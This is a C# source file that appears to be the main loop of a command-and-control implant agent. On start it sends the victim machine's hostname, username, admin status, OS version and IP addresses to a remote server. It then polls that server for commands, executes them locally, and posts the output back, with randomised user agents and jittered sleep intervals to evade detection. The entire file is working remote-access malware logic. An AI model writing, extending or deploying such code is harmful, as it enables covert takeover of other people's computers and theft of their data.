using System;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Agent;
using Agent.Models;

class Program
{
    static readonly HttpClient client = CreateHttpClient();

    static HttpClient CreateHttpClient()
    {
        var c = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(30)
        };
        c.DefaultRequestHeaders.Add("User-Agent", Config.GetRandomUserAgent());
        return c;
    }

    static async Task<int> Main(string[] args)
    {
        var info = new SystemInfo();

        // ensure session header reflects current agent id
        if (client.DefaultRequestHeaders.Contains("X-Session-Id"))
            client.DefaultRequestHeaders.Remove("X-Session-Id");
        client.DefaultRequestHeaders.Add("X-Session-Id", info.Uuid.FirstOrDefault() ?? string.Empty);

        await CheckinAsync(info).ConfigureAwait(false);

        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (s, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        var executor = new CommandExecution();
        var rng = Random.Shared;

        while (!cts.IsCancellationRequested)
        {
            try
            {
                var task = await GetTaskAsync(cts.Token).ConfigureAwait(false);
                if (!string.IsNullOrEmpty(task))
                {
                    string output = executor.Run(task);
                    await SendResultAsync(info.Uuid.FirstOrDefault() ?? string.Empty, task, output, cts.Token).ConfigureAwait(false);
                }
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"[Agent] Loop error: {ex.Message}");
            }

            int sleep = Config.GetPollingInterval() + rng.Next(0, Config.GetJitterMax());
            try
            {
                await Task.Delay(sleep, cts.Token).ConfigureAwait(false);
            }
            catch (OperationCanceledException) { break; }
        }

        return 0;
    }

    static async Task CheckinAsync(SystemInfo info)
    {
        try
        {
            var payload = new CheckinPayload(
                info.Uuid.FirstOrDefault() ?? string.Empty,
                info.Hostname,
                info.Username,
                info.IsAdmin,
                info.OsVersion,
                info.Machine,
                info.IpPriv,
                info.IpPub
            );

            var json = JsonSerializer.Serialize(payload);
            using var content = new StringContent(json, Encoding.UTF8, "application/json");
            using var resp = await client.PostAsync(Config.GetServerUrl() + "/checkin", content).ConfigureAwait(false);
            if (!resp.IsSuccessStatusCode)
                Console.Error.WriteLine($"Checkin failed: {resp.StatusCode}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Checkin error: {ex.Message}");
        }
    }

    static async Task<string?> GetTaskAsync(CancellationToken ct)
    {
        try
        {
            using var resp = await client.GetAsync(Config.GetServerUrl() + "/task", ct).ConfigureAwait(false);
            if (resp.StatusCode == System.Net.HttpStatusCode.NoContent)
                return null;

            var content = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
            try
            {
                return JsonSerializer.Deserialize<string>(content) ?? content.Trim('"');
            }
            catch
            {
                return content.Trim('"');
            }
        }
        catch (OperationCanceledException) { throw; }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"GetTask error: {ex.Message}");
            return null;
        }
    }

    static async Task SendResultAsync(string agentId, string command, string output, CancellationToken ct)
    {
        try
        {
            var payload = new ResultPayload(agentId, command, output);
            var json = JsonSerializer.Serialize(payload);
            
            using var content = new StringContent(json, Encoding.UTF8, "application/json");
            using var resp = await client.PostAsync(Config.GetServerUrl() + "/result", content, ct).ConfigureAwait(false);
            if (!resp.IsSuccessStatusCode)
                Console.Error.WriteLine($"SendResult failed: {resp.StatusCode}");
        }
        catch (OperationCanceledException) { throw; }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"SendResult error: {ex.Message}");
        }
    }
}